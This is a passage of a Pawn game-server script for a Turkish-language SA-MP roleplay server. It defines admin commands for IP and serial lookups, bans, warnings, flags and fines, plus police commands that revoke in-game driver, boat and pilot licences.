    if(PlayerInfo[playerid][pAdmin] >= 1 && PlayerInfo[playerid][pAdmin] < 4) {
        JetPack[playerid] = 1;
        SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USEJETPACK);
        return 1;
    }
    new string[128], plo;
    if(sscanf(params, "u", plo)) {
        SendClientMessage(playerid, COLOR_GRAD2, "KULLANIM: /jetpack [Oyuncu ID/Ýsim]");
        return 1;
    }
    if(IsPlayerConnected(plo)) {
        if(plo != INVALID_PLAYER_ID) {
            if(PlayerInfo[playerid][pAdmin] >= 4) {
                SendClientMessage(plo, COLOR_GRAD1, "Jetpack ile iyi eðlenceler!");
                JetPack[plo] = 1;
                SetPlayerSpecialAction(plo, SPECIAL_ACTION_USEJETPACK);
                format(string, sizeof(string), "AdminKomutu: %s kiþisi,  %s kiþisinden jetpack aldý", GetPlayerNameEx(plo), GetPlayerNameEx(playerid));
                ABroadCast(COLOR_LIGHTRED, string, 1);
            }
            else {
                SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
            }
        }
    }
    else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
    return 1;
}

CMD:serial(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 		{
  			SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
		}
		new giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /serial [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid))
		{
			new string[256];
			new serial[128];
			gpci(giveplayerid, serial, sizeof(serial));
			format(string, sizeof(string), "(ID: %d) - (Name: %s) - (Serial: %s)", giveplayerid, GetPlayerNameEx(giveplayerid), serial);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:ipcheck(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 		{
  			SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
		}
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /ipcheck [Oyuncu ID/Ýsim]");

		if(giveplayerid == INVALID_PLAYER_ID) return 1;
		if(IsPlayerConnected(giveplayerid))
		{
			new playerip[32];
			GetPlayerIp(giveplayerid, playerip, sizeof(playerip));
			format(string, sizeof(string), "(ID: %d) - (Isim: %s) - (IP: %s)", giveplayerid, GetPlayerNameEx(giveplayerid), playerip);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:oipcheck(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 2)
		return SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");

	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

	if(isnull(params))
	    return SendClientMessage(playerid, COLOR_GREY, "KULLANIM: /oipcheck [name]");

	new
		string[128],
		szPlayerName[MAX_PLAYER_NAME];

	mysql_real_escape_string(params, szPlayerName, g_MySQLConnections[0]);

	format(string, sizeof(string), "SELECT Username, LastIP FROM players WHERE Username = '%s'", szPlayerName);
	mysql_query(string, THREAD_OFFLINE_IP_CHECK, playerid, g_MySQLConnections[0]);
	return 1;
}

CMD:ip(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
		{
			SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
		}
		if(isnull(params)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /ip [ip]");

		new string[128], IP[32];

		foreach(Player, i)
		{
			GetPlayerIp(i, IP, sizeof(IP));
			if(strfind(IP, params, true) != -1)
			{
				format(string, sizeof(string), "Oyuncu: %s (ID: %d) | IP: %s", GetPlayerNameEx(i), i, IP);
				SendClientMessage(playerid, COLOR_WHITE, string);
			}
		}
	}

	return 1;
}

CMD:unbanip(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4 || PlayerInfo[playerid][pBanAppealer] >= 1)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
		{
			SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
		}
		if(isnull(params)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /unbanip [ip]");
		if(IsValidIP(params)) return SendClientMessage(playerid, COLOR_WHITE, "Bu geçerli bir IP adresi deðil!");

		new string[128];
		RemoveBan(params);
		format(string, 128, "AdminKomutu: %s, IP %s nin banýný açtý", GetPlayerNameEx(playerid), params);
		ABroadCast(COLOR_LIGHTRED,string,2);
		format(string, sizeof(string), "AdminKomutu: %s, IP %s nin banýný açtý", GetPlayerNameEx(playerid), params);
		Log("logs/ban.log", string);
	}

	return 1;
}

CMD:unban(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 4 || PlayerInfo[playerid][pBanAppealer] >= 1) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new
		    szPlayerName[MAX_PLAYER_NAME],
			string[128];

		if(isnull(params))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /unban [oyuncuadý]");

		mysql_real_escape_string(params, szPlayerName, g_MySQLConnections[0]);

		format(string, sizeof(string), "SELECT Banned, Permabanned, Warnings, LastIP, Username FROM players WHERE Username = '%s'", szPlayerName);
		mysql_query(string, THREAD_CHECK_BANNED, playerid, g_MySQLConnections[0]);
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:oban(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 4)
		return SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");

 	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

	new
		string[128],
		playername[MAX_PLAYER_NAME],
		reason[64];

	if(sscanf(params, "s[MAX_PLAYER_NAME]s[64]", playername, reason))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /oban [oyuncuadý] [sebep]");

    new
		giveplayerid = ReturnUser(playername);

	if(IsPlayerConnected(giveplayerid))
		return SendClientMessage(playerid, COLOR_GRAD2, "Bu kullanýcý online, /ban komutunu kullanabilirsin.");

	SetPVarString(playerid, "obanreason", reason);

	new
	    szPlayerName[MAX_PLAYER_NAME];

	mysql_real_escape_string(playername, szPlayerName, g_MySQLConnections[0]);

	format(string, sizeof(string), "SELECT Permabanned, Banned, AdminLevel, Username, LastIP, ID FROM players WHERE Username = '%s'", szPlayerName);
	mysql_query(string, THREAD_OFFLINE_BAN, playerid, g_MySQLConnections[0]);
	return 1;
}

CMD:genelmesaj(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 3)
		return SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanma yetkiniz yok!");

 	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

	new
		string[128];

	if(isnull(params))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /ozelmesaj [text]");

	format(string, sizeof(string), "SMS: %s, Gönderen: OZELMESAJ (555)",params);
	SendClientMessageToAllEx(COLOR_YELLOW, string);
	return 1;
}

CMD:warn(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 2) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new
			string[128],
			giveplayerid,
			reason[64];

		if(sscanf(params, "us[64]", giveplayerid, reason))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /warn [Oyuncu ID/Ýsim] [sebep]");

		if(IsPlayerConnected(giveplayerid)) {
			if(PlayerInfo[giveplayerid][pAdmin] >= 1)
				return SendClientMessage(playerid, COLOR_GRAD2, "Adminler uyarýlamaz!");

			PlayerInfo[giveplayerid][pWarns] += 1;

			if(PlayerInfo[giveplayerid][pWarns] >= 3) {
				new ip[32];
				GetPlayerIp(giveplayerid,ip,sizeof(ip));
				format(string, sizeof(string), "AdminKomutu: %s (IP: %s), %s tarafýndan banlandý(3 uyarýsý vardý), sebep: %s", GetPlayerNameEx(giveplayerid), ip, GetPlayerNameEx(playerid), reason);
				Log("logs/ban.log", string);
				format(string, sizeof(string), "AdminKomutu: %s,  %s tarafýndan banlandý(3 uyarýsý vardý), sebep: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
				SendClientMessageToAllEx(COLOR_LIGHTRED, string);
				PlayerInfo[giveplayerid][pBanned] = 1;
				AddBan(ip);
				Kick(giveplayerid);
				return 1;
			}

			format(string, sizeof(string), "AdminKomutu: %s, %s tarafýndan uyarýldý, sebep: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
			ABroadCast(COLOR_LIGHTRED, string, 1);
			format(string, sizeof(string), "AdminKomutu: %s, %s tarafýndan uyarýldý, sebep: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
			Log("logs/admin.log", string);
			punishmentLog(giveplayerid, playerid, 1, string, reason);

			format(string, sizeof(string), "%s tarafýndan uyarýldýn, sebep: %s", GetPlayerNameEx(playerid), reason);
			SendClientMessage(giveplayerid, COLOR_LIGHTRED, string);
			return 1;

		}
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	return 1;
}

CMD:owarn(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 3)
		return SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");

	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

	new
		string[128],
		name[MAX_PLAYER_NAME],
		reason[64];

	if(sscanf(params, "s[24]s[64]", name, reason))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /owarn [name] [sebep]");

	new
		giveplayerid = ReturnUser(name);

	if(giveplayerid != INVALID_PLAYER_ID)
		return SendClientMessage(playerid, COLOR_GRAD2, "Bu oyuncu online, /warn komutunu kullanabilirsin.");

	SetPVarString(playerid, "owarnreason", reason);

	new
	    szPlayerName[MAX_PLAYER_NAME];

	mysql_real_escape_string(name, szPlayerName, g_MySQLConnections[0]);

	format(string, sizeof(string), "SELECT Permabanned, Banned, AdminLevel, Username, LastIP, Warnings, ID FROM players WHERE Username = '%s'", szPlayerName);
	mysql_query(string, THREAD_OFFLINE_WARN, playerid, g_MySQLConnections[0]);
	return 1;
}

CMD:ofine(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 3)
		return SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");

	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

	new
		string[128],
		name[MAX_PLAYER_NAME],
		amount,
		reason[64];

	if(sscanf(params, "s[MAX_PLAYER_NAME]ds[64]", name, amount, reason))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /ofine [name] [amount] [sebep]");

	new
		giveplayerid = ReturnUser(name);

	if(giveplayerid != INVALID_PLAYER_ID)
		return SendClientMessage(playerid, COLOR_GRAD2, "Bu oyuncu online, /fine komutunu kullanabilirsin.");

	if(amount < 1)
		return SendClientMessage(playerid, COLOR_GRAD2, "Miktar 0'dan büyük olmalý.");

	SetPVarString(playerid, "ofinereason", reason);
	SetPVarInt(playerid, "ofineamount", amount);

	new
	    szPlayerName[MAX_PLAYER_NAME];

	mysql_real_escape_string(name, szPlayerName, g_MySQLConnections[0]);

	format(string, sizeof(string), "SELECT Permabanned, Banned, AdminLevel, Username, LastIP, Bank, Cash FROM players WHERE Username = '%s'", szPlayerName);
	mysql_query(string, THREAD_OFFLINE_FINE, playerid, g_MySQLConnections[0]);

	return 1;
}

CMD:showflags(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new string[128];
		SendClientMessage(playerid, COLOR_YELLOW, "Önemli bayrak: (tarih formatý DD/MM/YYYY ör. 03/05/2012)");
		new fCounter;
		foreach(Player, i)
		{
			if(strlen(PlayerInfo[i][pFlag]) > 0)
			{
				format(string, sizeof(string), "%s (ID %d) | Sebep: %s.",GetPlayerNameEx(i),i,PlayerInfo[i][pFlag]);
				SendClientMessage(playerid, COLOR_GRAD1, string);
				fCounter += 1;
			}
		}
		if(fCounter <= 0)
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Yok.");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanmaya yetkin yok.");
	}
	return 1;
}

CMD:oflag(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 2) {
    	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new
			string[128],
			name[MAX_PLAYER_NAME],
			reason[64];

		if(sscanf(params, "s[24]s[64]", name, reason))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /oflag [name] [sebep]");

    	new
			giveplayerid = ReturnUser(name);

        if(IsPlayerConnected(giveplayerid)) {
			AddFlag(giveplayerid, playerid, reason);
			SendClientMessage(playerid, COLOR_WHITE, "Oyuncu online ve bayraklandý!");

			format(string, sizeof(string), "AdminKomutu: %s, %s tarafýndan bayraklandý, sebep: %s.", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
			ABroadCast(COLOR_LIGHTRED, string, 1);
		} else {
		    new
		        szPlayerName[MAX_PLAYER_NAME],
		        szFlag[128],
		        szQuery[128];

			mysql_real_escape_string(name, szPlayerName, g_MySQLConnections[0]);

			mysql_real_escape_string(reason, szFlag, g_MySQLConnections[0]);
			SetPVarString(playerid, "offline_flag", szFlag);
			SetPVarString(playerid, "offline_flag_target", szPlayerName);

			format(szQuery, sizeof(szQuery), "SELECT Username FROM players WHERE Username = '%s'", szPlayerName);
			mysql_query(szQuery, THREAD_OFFLINE_FLAG, playerid, g_MySQLConnections[0]);
		}
		return 1;
	}
	return 1;
}

CMD:flag(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 3) {
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	        return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");

		new string[128], giveplayerid, reason[64];
		if(sscanf(params, "us[64]", giveplayerid, reason))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /flag [Oyuncu ID/Ýsim] [sebep]");

		if(giveplayerid != INVALID_PLAYER_ID) {
			AddFlag(giveplayerid, playerid, reason);
			format(string, sizeof(string), "AdminKomutu: %s,%s kiþisini bayrakladý, sebep: %s.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), reason);
			ABroadCast(COLOR_LIGHTRED, string, 1);
			return 1;
		} else SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
	}
	else if(PlayerInfo[playerid][pHelper] >= 2) {
		new string[128], giveplayerid, reason[64];
		if(sscanf(params, "us[64]", giveplayerid, reason))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /flag [Oyuncu ID/Ýsim] [sebep]");

		if(giveplayerid != INVALID_PLAYER_ID) {
		    if(strlen(PlayerInfo[giveplayerid][pFlag]) != 0) {
				return SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu zaten aktif bir bayraða sahip, yardýmcýlar sadece bayraðý olmayan oyuncular için bayrak oluþturabilir.");
			}

			AddFlag(giveplayerid, playerid, reason);
			format(string, sizeof(string), "AdminKomutu: %s, Yardýmcý %s tarafýndan bayraklandý, sebep: %s.", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
			ABroadCast(COLOR_LIGHTRED, string, 1);

			format(string, sizeof(string), "%s kiþisi %s sebebiyle bayraklandý.", GetPlayerNameEx(giveplayerid), reason);
			SendClientMessage(playerid, COLOR_WHITE, string);
			return 1;
		} else SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
	}
	return 1;
}

CMD:clearflag(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
	    if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new
			iTargetID;

		if(sscanf(params, "u", iTargetID)) {
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /clearflag [Oyuncu ID/Ýsim]");
		}
		else if(IsPlayerConnected(iTargetID)) {
			if(!isnull(PlayerInfo[iTargetID][pFlag])) {

				new
					szMessage[59 + (MAX_PLAYER_NAME * 2)];

                format(PlayerInfo[iTargetID][pFlag], 128, "");
				format(szMessage, sizeof(szMessage), "{AA3333}AdminUyarý{FFFF00}: %s, %s kiþisinin tüm bayraklarýný temizledi.", GetPlayerNameEx(playerid), GetPlayerNameEx(iTargetID));
				PlayerInfo[iTargetID][pInt] = GetPlayerInterior(iTargetID);

				if(GetPVarType(iTargetID, "tabbedVW") != 0) {
					PlayerInfo[iTargetID][pVW] = GetPVarInt(iTargetID, "tabbedVW");
				} else PlayerInfo[iTargetID][pVW] = GetPlayerVirtualWorld(iTargetID);

				GetPlayerIp(iTargetID, PlayerInfo[iTargetID][pIP], 32);
				GetPlayerPos(iTargetID, PlayerInfo[iTargetID][pPos_x], PlayerInfo[iTargetID][pPos_y], PlayerInfo[iTargetID][pPos_z]);
				GetPlayerFacingAngle(iTargetID, PlayerInfo[iTargetID][pPos_r]);
				OnPlayerStatsUpdate(iTargetID);
				return ABroadCast(COLOR_YELLOW, szMessage, 1);
			}
			SendClientMessage(playerid, COLOR_GRAD1, "Oyuncunun önemli bayraðý yok.");
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	return 1;
}

CMD:elkoysurucubelgesi(playerid, params[])
{
	if(IsACop(playerid)) {
		new
			string[128],
			giveplayerid,
			reason[64],
			copveh = GetPlayerVehicleID(playerid);

		if(sscanf(params, "us[64]", giveplayerid, reason))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /elkoysurucubelgesi [Oyuncu ID/Ýsim] [sebep]");

		if((IsACopCar(copveh)) || (IsAFBICar(copveh))) {
			if(IsPlayerConnected(giveplayerid)) {
				if(PlayerInfo[giveplayerid][pCarLic] == 0)
					return SendClientMessage(playerid, COLOR_GRAD2, "Bu oyuncunun iptal edilebilecek sürücü belgesi yok.");

				new
					szRank[64],
					szEmployer[64],
					szDivision[64];
				GetPlayerFactionInfo(playerid, szRank, szDivision, szEmployer);

				format(string,sizeof(string),"%s %s %s, sürücü belgeni iptal etti, sebep: %s.",szEmployer, szRank, GetPlayerNameEx(playerid), reason);
				SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);

				format(string,sizeof(string),"HQ: %s %s %s, %s kiþisinin sürücü belgesini iptal etti, sebep: %s.",szEmployer, szRank, GetPlayerNameEx(playerid),GetPlayerNameEx(giveplayerid),reason);
				SendRadioMessage(1,TEAM_BLUE_COLOR,string);
				SendRadioMessage(2,TEAM_BLUE_COLOR,string);

				SendClientMessage(giveplayerid,COLOR_WHITE,"(( Yeni bir sürücü belgesi City Hall'dan alýnabilir. Eðer bunu bir suistimal/kötüye kullanma olarak görüyorsan adminle baðlantýya geç. ))");
				format(string, sizeof(string), "%s, %s kiþisinin sürücü belgesini aldý. Sebep: %s.", GetPlayerNameEx(playerid),GetPlayerNameEx(giveplayerid),reason);
				Log("logs/licenses.log", string);
				PlayerInfo[giveplayerid][pCarLic] = 0;
				return 1;
			} else SendClientMessage(playerid, COLOR_GRAD2, "Geçersiz oyuncu.");
		} else SendClientMessage(playerid, COLOR_GRAD2,"Bunu yapmak için bir kuruluþ aracýnda olman gerekir.");
	} else SendClientMessage(playerid, COLOR_GRAD2, "Bunu yapmaya yetkin yok.");
	return 1;
}

CMD:elkoydenizcibelgesi(playerid, params[])
{
	if(IsACop(playerid)) {
		new
			string[128],
			giveplayerid,
			reason[64],
			copveh = GetPlayerVehicleID(playerid);

		if(sscanf(params, "us[64]", giveplayerid, reason))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /elkoydenizcibelgesi [Oyuncu ID/Ýsim] [sebep]");

		if((IsACopCar(copveh)) || (IsAFBICar(copveh))) {
			if(IsPlayerConnected(giveplayerid)) {
				if(PlayerInfo[giveplayerid][pBoatLic] == 0)
					return SendClientMessage(playerid, COLOR_GRAD2, "Bu oyuncunun iptal edilebilecek bir tekne lisansý yok.");

				new
					szRank[64],
					szEmployer[64],
					szDivision[64];
				GetPlayerFactionInfo(playerid, szRank, szDivision, szEmployer);

				format(string,sizeof(string),"%s %s %s, senin tekne lisansýný iptal etti, sebep: %s.",szEmployer, szRank, GetPlayerNameEx(playerid), reason);
				SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);

				format(string,sizeof(string),"HQ: %s %s %s, %s kiþisinin tekne lisansýný iptal etti, sebep: %s.",szEmployer, szRank, GetPlayerNameEx(playerid),GetPlayerNameEx(giveplayerid),reason);
				SendRadioMessage(1,TEAM_BLUE_COLOR,string);
				SendRadioMessage(2,TEAM_BLUE_COLOR,string);

				SendClientMessage(giveplayerid,COLOR_WHITE,"(( Yeni bir tekne lisansý City Hall'dan alýnabilir. Eðer bunu bir suistimal/kötüye kullanma olarak görüyorsan adminle baðlantýya geç. ))");
				format(string, sizeof(string), "%s, %s kiþisinin tekne lisansýný aldý. Sebep: %s.", GetPlayerNameEx(playerid),GetPlayerNameEx(giveplayerid),reason);
				Log("logs/licenses.log", string);
				PlayerInfo[giveplayerid][pBoatLic] = 0;
				return 1;
			} else SendClientMessage(playerid, COLOR_GRAD2, "Geçersiz oyuncu.");
		} else SendClientMessage(playerid, COLOR_GRAD2,"Bunu yapmak için bir kuruluþ aracýnda olman gerekir.");
	} else SendClientMessage(playerid, COLOR_GRAD2, "Bunu yapmaya yetkin yok.");
	return 1;
}

CMD:elkoypilotbelgesi(playerid, params[])
{
	if(IsACop(playerid)) {
		new
			string[128],
			giveplayerid,
			reason[64],
			copveh = GetPlayerVehicleID(playerid);

		if(sscanf(params, "us[64]", giveplayerid, reason))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /elkoypilotbelgesi [Oyuncu ID/Ýsim] [sebep]");

		if((IsACopCar(copveh)) || (IsAFBICar(copveh))) {
			if(IsPlayerConnected(giveplayerid)) {
				if(PlayerInfo[giveplayerid][pFlyLic] == 0)
					return SendClientMessage(playerid, COLOR_GRAD2, "Bu oyuncunun iptal edilebilecek pilot lisansý yok.");

				new
					szRank[64],
					szEmployer[64],
					szDivision[64];
				GetPlayerFactionInfo(playerid, szRank, szDivision, szEmployer);

				format(string,sizeof(string),"%s %s %s, senin pilot lisansýný iptal etti, sebep: %s.",szEmployer, szRank, GetPlayerNameEx(playerid), reason);
				SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);

				format(string,sizeof(string),"HQ: %s %s %s, %s kiþisinin pilot lisansýný iptal etti, sebep: %s.",szEmployer, szRank, GetPlayerNameEx(playerid),GetPlayerNameEx(giveplayerid),reason);
				SendRadioMessage(1,TEAM_BLUE_COLOR,string);
				SendRadioMessage(2,TEAM_BLUE_COLOR,string);

				SendClientMessage(giveplayerid,COLOR_WHITE,"(( Yeni bir pilot lisansý City Hall'dan alýnabilir. Eðer bunu bir suistimal/kötüye kullanma olarak görüyorsan adminle baðlantýya geç. ))");
				format(string, sizeof(string), "%s took %s's pilot license. sebep: %s.", GetPlayerNameEx(playerid),GetPlayerNameEx(giveplayerid),reason);
				Log("logs/licenses.log", string);
				PlayerInfo[giveplayerid][pFlyLic] = 0;
				return 1;
			} else SendClientMessage(playerid, COLOR_GRAD2, "Geçersiz oyuncu.");
		} else SendClientMessage(playerid, COLOR_GRAD2,"Bunu yapmak için bir kuruluþ aracýnda olman gerekir.");
	} else SendClientMessage(playerid, COLOR_GRAD2, "Bunu yapmaya yetkin yok.");
	return 1;
}

CMD:belgeal(playerid, params[])
{
	if(!IsPlayerInRangeOfPoint(playerid,2.0,-1209.552001, -171.159011, 4891.833007)) { return 1; }
	if(PlayerInfo[playerid][pWantedLevel] > 0)
	{
		SendClientMessage(playerid, COLOR_LIGHTRED, "Önemli bir arama iznin var - belgenin elde edilmesi yasaklanmýþ.");
		return 1;
	}
	ShowPlayerDialogEx(playerid, DIALOG_LICENSE_BUY, DIALOG_STYLE_LIST, "Elde etmek istediðin belgeyi seç.", "Sürücü Belgesi ($500)\r\nTekne Belgesi ($500)\r\nPilot Belgesi ($2500)", "Satýn Al", "Iptal");
	return 1;
}

CMD:yoketlisans(playerid, params[])
{
	new string[128], type;
	if(sscanf(params, "d", type))
	{
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /yoketlisans [type]");
		SendClientMessage(playerid, COLOR_GRAD2, "Tip: 1 = Sürücü, 2 = Tekne, 3 = Uçuþ.");
	}

	switch(type)
	{
	case 1:
		{
			if(PlayerInfo[playerid][pCarLic] == 0)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Býrakabileceðin bir sürücü belgen yok.");
				return 1;
			}
			format(string, sizeof(string), "Sürücü belgeni býraktýn.");
			SendClientMessage(playerid, COLOR_WHITE, string);
			PlayerInfo[playerid][pCarLic] = 0;
			return 1;
		}
	case 2:
		{
			if(PlayerInfo[playerid][pBoatLic] == 0)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Býrakabileceðin bir tekne belgen yok.");
				return 1;
			}
			format(string, sizeof(string), "Tekne belgeni býraktýn.");
			SendClientMessage(playerid, COLOR_WHITE, string);
			PlayerInfo[playerid][pBoatLic] = 0;
			return 1;
		}
	case 3:
		{
			if(PlayerInfo[playerid][pFlyLic] == 0)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Býrakabileceðin bir pilot belgen yok.");
				return 1;
			}
			format(string, sizeof(string), "Pilot belgeni býraktýn.");
			SendClientMessage(playerid, COLOR_WHITE, string);
			PlayerInfo[playerid][pFlyLic] = 0;
			return 1;
		}
	default:
		{
			SendClientMessage(playerid, COLOR_WHITE, "Geçersiz lisans tipi! /yoketlicense [type]");
			SendClientMessage(playerid, COLOR_GRAD2, "Tip: 1 = Sürücü, 2 = Tekne, 3 = Uçuþ.");
		}
	}
	return 1;
}

CMD:cetearaclarispawnla(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 3) {
	    new
			iGang;

	    if(sscanf(params, "d", iGang))
	        return SendClientMessage(playerid, COLOR_GREY, "KULLANIM: /cetearaclarispawnla [gang slot ID]");

		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6) {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

	    if(iGang < 1 || iGang > MAX_FAMILY || iGang > 255)
			return SendClientMessage(playerid, COLOR_GREY, "Aile slotu 1 ve 14 arasýnda olmalý.");

		iGang--; // the silly way the family system is scripted

		for(new v = 0; v < MAX_GANG_VEHICLES; v++) {
		    if(FamilyVehicleInfo[iGang][v][fvId] > 0 && IsVehicleOccupied(FamilyVehicleInfo[iGang][v][fvId]) == INVALID_VEHICLE_ID)
				SetVehicleToRespawn(FamilyVehicleInfo[iGang][v][fvId]);
		}

		new
		    szMessage[64];

		format(szMessage, sizeof(szMessage), "Tüm çete arabalarýný çýkardýnýz: %s.", FamilyInfo[iGang][FamilyName]);
		SendClientMessage(playerid, COLOR_WHITE, szMessage);
	} else return SendClientMessage(playerid, COLOR_GREY, "Geçersiz çete ID'si.");
	return 1;
}

CMD:olusumaraclarispawnla(playerid, params[]) {
	if(PlayerInfo[playerid][pFaction] == 1 && PlayerInfo[playerid][pRank] >= 5 || PlayerInfo[playerid][pLeader] == 1) {
		for(new v = 0; v < sizeof(LSPDVehicles); v++) {
